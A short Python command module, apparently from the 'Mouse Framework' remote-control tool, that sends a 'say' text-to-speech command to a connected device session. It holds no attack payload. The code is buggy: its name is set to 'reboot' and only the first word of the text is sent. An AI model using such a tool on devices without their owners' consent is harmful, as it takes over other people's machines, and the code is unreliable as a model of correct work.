#!/usr/bin/env python3

#            ---------------------------------------------------
#                              Mouse Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.helper as h
import time

class command:
	def __init__(self):
		self.name = "reboot"
		self.description = "Convert text to speach."
		self.usage = "Usage: say <text>"

	def run(self,session,cmd_data):
		if len(cmd_data['args'].split()) < 2:
			print(self.usage)
		else:
			session.send_command({"cmd":"say","args":cmd_data['args'].split()[1]})